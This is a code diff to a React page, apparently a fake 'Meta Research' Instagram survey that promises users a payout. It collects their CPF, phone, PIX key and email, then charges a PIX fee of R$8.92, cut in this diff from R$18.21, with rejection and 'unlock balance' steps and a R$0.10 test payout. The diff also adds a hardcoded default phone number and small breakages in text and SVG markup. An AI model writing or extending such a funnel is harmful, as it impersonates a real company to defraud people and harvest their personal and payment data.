@@ -35,8 +35,9 @@ export default function MetaResearchPromotion() {
     fullName: "",
     phone: "",
     pixKey: "",
+    email: "", // Added email field
   })
-  type PixKeyType = "cpf" | "phone"
+  type PixKeyType = "cpf" | "phone" | "email" // Added email type
   const [selectedPixKeyType, setSelectedPixKeyType] = useState<PixKeyType | null>(null)
   const [showUnlockAnimation, setShowUnlockAnimation] = useState(false)
   const [showSupportTooltip, setShowSupportTooltip] = useState(false)
@@ -160,15 +161,15 @@ export default function MetaResearchPromotion() {
 
       const transactionData = {
         external_id: `monjaro-pobre-${Date.now()}`,
-        total_amount: 18.21,
+        total_amount: 8.92,
         payment_method: "PIX",
-        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/webhook/lira-pay`,
+        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
         items: [
           {
             id: "Monajaro-pobre",
             title: "Monajaro de Pobre",
             description: "Monajaro-pobre",
-            price: 18.21,
+            price: 8.92,
             quantity: 1,
             is_physical: false,
           },
@@ -190,12 +191,24 @@ export default function MetaResearchPromotion() {
 
       console.log("[v0] Creating PIX payment with data:", transactionData)
 
-      const response = await fetch("/api/lira-pay/create-transaction", {
+      console.log("[v0] Creating deposit payment with KeyClub API:", transactionData)
+
+      const response = await fetch("/api/keyclub/deposit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(transactionData),
+        body: JSON.stringify({
+          amount: 8.92,
+          external_id: transactionData.external_id,
+          clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
+          payer: {
+            name: fullName || paymentData.fullName || "Usuario",
+            email: paymentData.email || "usuario@email.com",
+            document: cleanCpf,
+          },
+          utm_params: utmParams,
+        }),
       })
 
       const result = await response.json()
@@ -280,10 +293,13 @@ export default function MetaResearchPromotion() {
           ? "Digite seu CPF"
           : selectedPixKeyType === "phone"
             ? "(DDD) Seu Numero"
-            : "Selecione o tipo de chave PIX",
+            : selectedPixKeyType === "email"
+              ? "Seu melhor e-mail"
+              : "Selecione o tipo de chave PIX",
       pixKeyTypes: {
         cpf: "CPF",
         phone: "Celular",
+        email: "E-mail", // Added email type
       },
       paymentInfo: "O pagamento será efetuado, após verificação dos dados.",
       confirmData: "CONFIRMAR DADOS",
@@ -324,7 +340,7 @@ export default function MetaResearchPromotion() {
           question:
             "Você já encontrou erros ou falhas (bugs) na plataforma que prejudicaram sua navegação ou experiência no Instagram?",
           options: [
-            "Nunca notei nenhum bug",
+            "Nunca noteei nenhum bug",
             "Sim, mas não atrapalhou muito",
             "Sim, atrapalhou bastante minha navegação",
             "Sim, cheguei a desistir de usar a plataforma por causa disso",
@@ -675,7 +691,9 @@ export default function MetaResearchPromotion() {
         // Remove caracteres não numéricos e verifica se tem 11 dígitos (incluindo DDD)
         const phone = key.replace(/\D/g, "")
         return phone.length === 11
-      // Removendo validação de email
+      case "email":
+        // Validação básica de e-mail
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(key)
       default:
         return false
     }
@@ -900,10 +918,19 @@ export default function MetaResearchPromotion() {
 
   const handlePaymentSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+
+    if (!paymentData.phone || !paymentData.pixKey || !paymentData.email) {
+      alert("Por favor, preencha todos os campos obrigatórios")
+      return
+    }
+
     setPaymentData((prev) => ({
       ...prev,
-      fullName: fullName, // Usando o nome coletado no início do funil
+      fullName: fullName || "Usuário Meta Research", // Using collected name or default
+      phone: prev.phone || "11952395861", // Use filled phone or default
+      email: prev.email || "usuario@metaresearch.com", // Use filled email or default
     }))
+
     setShowConfirmationModal(true)
   }
 
@@ -914,25 +941,54 @@ export default function MetaResearchPromotion() {
     setPixValidationLoading(true)
 
     try {
-      // Validar dados do pagamento
-      if (!paymentData.pixKey || !selectedPixKeyType) {
+      if (!paymentData.pixKey || !paymentData.phone || !paymentData.email) {
         alert("Por favor, preencha todos os dados PIX")
         setPixValidationLoading(false)
+        setShowPixValidationModal(false)
+        setShowConfirmationModal(true)
+        return
+      }
+
+      let pixKeyType = selectedPixKeyType
+      if (!pixKeyType) {
+        // Auto-detect based on the PIX key format
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(paymentData.pixKey)) {
+          pixKeyType = "email"
+          setSelectedPixKeyType("email")
+        } else if (/^\d{11}$/.test(paymentData.pixKey.replace(/\D/g, ""))) {
+          const digits = paymentData.pixKey.replace(/\D/g, "")
+          if (digits.length === 11 && digits.startsWith("11")) {
+            pixKeyType = "phone"
+            setSelectedPixKeyType("phone")
+          } else if (digits.length === 11) {
+            pixKeyType = "cpf"
+            setSelectedPixKeyType("cpf")
+          }
+        }
+      }
+
+      if (!pixKeyType) {
+        alert("Não foi possível identificar o tipo da chave PIX. Verifique se está no formato correto.")
+        setPixValidationLoading(false)
+        setShowPixValidationModal(false)
+        setShowConfirmationModal(true)
         return
       }
 
       // Validar chave PIX
-      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, selectedPixKeyType)) {
+      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, pixKeyType)) {
         alert("Chave PIX inválida para o tipo selecionado")
         setPixValidationLoading(false)
+        setShowPixValidationModal(false)
+        setShowConfirmationModal(true)
         return
       }
 
       const cashoutData = {
         amount: 0.1, // R$ 0,10 conforme especificado
         external_id: KeyClubAPI.generateExternalId(),
-        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, selectedPixKeyType),
-        key_type: selectedPixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
+        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, pixKeyType),
+        key_type: pixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
         description: `Saque Meta Research - ${fullName}`,
       }
 
@@ -968,6 +1024,7 @@ export default function MetaResearchPromotion() {
         if (prev <= 1) {
           clearInterval(countdownInterval)
           setShowRejectionModal(false)
+          setShowPaymentForm(false)
           setShowUnlockBalance(true)
           return 5
         }
@@ -1050,6 +1107,11 @@ export default function MetaResearchPromotion() {
         ...prev,
         [field]: value,
       }))
+    } else if (field === "pixKey" && selectedPixKeyType === "email") {
+      setPaymentData((prev) => ({
+        ...prev,
+        [field]: value,
+      }))
     } else {
       setPaymentData((prev) => ({
         ...prev,
@@ -1059,6 +1121,7 @@ export default function MetaResearchPromotion() {
   }
 
   const handleUnlockContinue = () => {
+    // </CHANGE> Redirect to /withdraw with UTM parameters instead of continuing internal funnel
     navigateWithUTM("/withdraw")
   }
 
@@ -1186,6 +1249,80 @@ export default function MetaResearchPromotion() {
           <Image src="/images/meta-logo.png" alt="Meta Logo" width={100} height={50} className="object-contain" />
         </div>
 
+        {showPaymentForm && (
+          <div
+            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
+            style={{
+              backgroundImage: "url(/images/background-form.png)",
+              backgroundSize: "cover",
+              backgroundPosition: "center",
+              backgroundRepeat: "no-repeat",
+            }}
+          >
+            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
+              <div className="text-center mb-6">
+                <h3 className="text-lg font-semibold text-gray-800 mb-2">{t.paymentData}</h3>
+                <p className="text-gray-600 mb-4">Preencha seus dados para receber o pagamento</p>
+              </div>
+
+              <form onSubmit={handlePaymentSubmit} className="space-y-4">
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
+                  <Input
+                    type="tel"
+                    placeholder="(11) 99999-9999"
+                    value={paymentData.phone}
+                    onChange={(e) => setPaymentData((prev) => ({ ...prev, phone: e.target.value }))}
+                    required
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-1">Chave PIX</label>
+                  <Input
+                    type="text"
+                    placeholder="Digite sua chave PIX"
+                    value={paymentData.pixKey}
+                    onChange={(e) => setPaymentData((prev) => ({ ...prev, pixKey: e.target.value }))}
+                    required
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
+                  <Input
+                    type="email"
+                    placeholder="seu@email.com"
+                    value={paymentData.email}
+                    onChange={(e) => setPaymentData((prev) => ({ ...prev, email: e.target.value }))}
+                    required
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
+                  />
+                </div>
+
+                <div className="space-y-3 mt-6">
+                  <Button
+                    type="submit"
+                    className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide"
+                  >
+                    Confirmar Dados
+                  </Button>
+                  <Button
+                    type="button"
+                    onClick={() => setShowPaymentForm(false)}
+                    variant="outline"
+                    className="w-full py-3 text-sm border-gray-300 text-gray-600 hover:text-gray-800 bg-transparent"
+                  >
+                    Voltar
+                  </Button>
+                </div>
+              </form>
+            </div>
+          </div>
+        )}
+
         {showQuestion5Popup && (
           <div className="fixed inset-0 backdrop-blur-sm flex items-center justify-center z-50 px-4 bg-white bg-white">
             <div className="bg-white rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
@@ -1256,6 +1393,10 @@ export default function MetaResearchPromotion() {
                 <div>
                   <span className="text-sm font-medium text-gray-700">{t.pixKey}</span>
                   <p className="text-gray-900">{paymentData.pixKey}</p>
+                </div>
+                <div>
+                  <span className="text-sm font-medium text-gray-700">Email:</span>
+                  <p className="text-gray-900">{paymentData.email}</p>
                 </div>
               </div>
 
@@ -1761,8 +1902,8 @@ export default function MetaResearchPromotion() {
           </div>
         ) : showPixStep ? (
           <div className="min-h-screen bg-white flex flex-col">
-            {!pixLoadingComplete ? (
-              <div className="flex-1 flex items-center justify-center px-4 py-8">
+            <div className="flex-1 flex items-center justify-center px-4 py-8">
+              {!pixLoadingComplete ? (
                 <div className="text-center space-y-4 w-full max-w-sm">
                   <div className="flex justify-center">
                     <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-pink-500"></div>
@@ -1772,9 +1913,7 @@ export default function MetaResearchPromotion() {
                     <p className="text-sm text-gray-600">Preparando seu pagamento...</p>
                   </div>
                 </div>
-              </div>
-            ) : (
-              <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
+              ) : (
                 <div className="text-center w-full max-w-sm space-y-4">
                   <div className="mx-auto w-20 h-20 flex items-center justify-center mb-3">
                     <Image
@@ -1831,7 +1970,7 @@ export default function MetaResearchPromotion() {
                   </Button>
 
                   <div className="text-center pt-2">
-                    <p className="text-lg font-bold text-gray-800">R$ 18,21</p>
+                    <p className="text-lg font-bold text-gray-800">R$ 8,92</p>
 
                     <div className="border border-red-200 rounded-md p-2 mb-4 bg-transparent border-none">
                       <p className="text-xs font-medium text-center border-none text-[rgba(255,2,19,1)]">
@@ -1845,7 +1984,7 @@ export default function MetaResearchPromotion() {
                           <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                             <path
                               fillRule="evenodd"
-                              d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 01-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"
+                              d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1h.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 01-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"
                               clipRule="evenodd"
                             />
                           </svg>
@@ -1855,7 +1994,7 @@ export default function MetaResearchPromotion() {
 
                       <div className="flex items-center text-left space-x-3">
                         <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
-                          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                             <path
                               fillRule="evenodd"
                               d="M3 4a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zm2 2V5h1v1H5zM3 13a1 1 0 011-1h3a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3zm2 2v-1h1v1H5zM13 3a1 1 0 00-1 1v3a1 1 0 001 1h3a1 1 0 001-1V4a1 1 0 00-1-1h-3zm1 2v1h1V5h-1z"
@@ -1895,119 +2034,8 @@ export default function MetaResearchPromotion() {
                     </div>
                   </div>
                 </div>
-              </div>
-            )}
-          </div>
-        ) : showPaymentForm ? (
-          <div className="flex flex-col min-h-screen">
-            <div className="flex-1 flex items-center justify-center">
-              <Card className="w-full max-w-md mx-auto bg-white shadow-none mb-0 rounded-xl mt-14">
-                <CardHeader className="text-center pb-4">
-                  <CardTitle className="text-lg font-semibold text-gray-800 mb-2">{t.paymentData}</CardTitle>
-                  <CardDescription className="text-sm text-gray-600">{t.paymentDescription}</CardDescription>
-                </CardHeader>
-                <CardContent className="px-6 pb-6 shadow-none">
-                  <form onSubmit={handlePaymentSubmit} className="space-y-4">
-                    <div>
-                      <label className="block text-sm font-medium text-gray-700 mb-1">{t.phone}</label>
-                      <Input
-                        type="tel"
-                        value={paymentData.phone}
-                        onChange={(e) => handleInputChange("phone", e.target.value)}
-                        required
-                        className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
-                        placeholder="(DDD) Seu Numero"
-                      />
-                    </div>
-
-                    <div>
-                      <label className="block text-sm font-medium text-gray-700 mb-3">{t.pixKey}</label>
-
-                      {/* Botões para selecionar tipo de chave PIX */}
-                      <div className="grid grid-cols-2 gap-2 mb-3">
-                        {(["cpf", "phone"] as const).map((type) => (
-                          <button
-                            key={type}
-                            type="button"
-                            onClick={() => {
-                              setSelectedPixKeyType(type)
-                              setPaymentData((prev) => ({ ...prev, pixKey: "" }))
-                            }}
-                            className={`px-3 py-2 rounded-lg text-sm font-medium transition-all duration-200 ${
-                              selectedPixKeyType === type
-                                ? "bg-transparent text-gray-900 shadow-lg ring-2 ring-gray-400 font-semibold"
-                                : "bg-gray-100 text-gray-700 hover:bg-gray-200 border border-gray-300"
-                            }`}
-                          >
-                            {t.pixKeyTypes[type]}
-                          </button>
-                        ))}
-                      </div>
-
-                      {/* Campo de input da chave PIX */}
-                      <Input
-                        type="text"
-                        value={paymentData.pixKey}
-                        onChange={(e) => handleInputChange("pixKey", e.target.value)}
-                        required
-                        disabled={!selectedPixKeyType}
-                        className={`w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 ${
-                          !selectedPixKeyType ? "bg-gray-50 cursor-not-allowed" : ""
-                        }`}
-                        placeholder={t.pixKeyPlaceholder}
-                      />
-
-                      {selectedPixKeyType &&
-                        paymentData.pixKey &&
-                        !validatePixKey(paymentData.pixKey, selectedPixKeyType) && (
-                          <p className="text-red-500 text-xs mt-1">
-                            {selectedPixKeyType === "cpf" && "CPF deve ter 11 dígitos"}
-                            {selectedPixKeyType === "phone" && "Número deve ter 11 dígitos (com DDD)"}
-                          </p>
-                        )}
-                    </div>
-
-                    <div className="text-xs text-gray-500 text-center mt-4 mb-6 px-2 leading-relaxed">
-                      <p>{t.paymentInfo}</p>
-                    </div>
-
-                    <div className="space-y-3">
-                      <Button
-                        type="submit"
-                        disabled={
-                          !selectedPixKeyType ||
-                          !paymentData.pixKey ||
-                          !validatePixKey(paymentData.pixKey, selectedPixKeyType) ||
-                          isPixKeyUsed(paymentData.pixKey)
-                        }
-                        className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
-                      >
-                        {isPixKeyUsed(paymentData.pixKey) ? "CHAVE PIX JÁ UTILIZADA" : t.confirmData}
-                      </Button>
-
-                      {isPixKeyUsed(paymentData.pixKey) && (
-                        <p className="text-red-500 text-xs text-center">
-                          Esta chave PIX já foi utilizada para saque. Use uma chave PIX diferente.
-                        </p>
-                      )}
-
-                      <Button
-                        type="button"
-                        onClick={() => setShowPaymentForm(false)}
-                        variant="outline"
-                        className="w-full py-3 text-sm border-gray-300 border-none"
-                      >
-                        {t.back}
-                      </Button>
-                    </div>
-                    <div className="text-center mt-6 pt-4 border-t border-gray-100">
-                      <p className="text-xs text-gray-500">{t.footerText}</p>
-                    </div>
-                  </form>
-                </CardContent>
-              </Card>
+              )}
             </div>
-            <div className="text-center py-4"></div>
           </div>
         ) : currentQuestion < questions.length ? (
           <div className="flex flex-col h-screen overflow-hidden">
@@ -2064,7 +2092,7 @@ export default function MetaResearchPromotion() {
               </div>
             </div>
           </div>
-        ) : (
+        ) : !showPaymentForm ? (
           <div className="flex flex-col min-h-screen">
             <div className="flex-1 flex items-center justify-center">
               <Card className="fixed inset-0 bg-opacity-20 flex items-center justify-center z-50 px-4 bg-transparent border shadow-xl">
@@ -2089,7 +2117,7 @@ export default function MetaResearchPromotion() {
               <p className="text-xs text-gray-500">{t.footerText}</p>
             </div>
           </div>
-        )}
+        ) : null}
       </div>
     )
   }
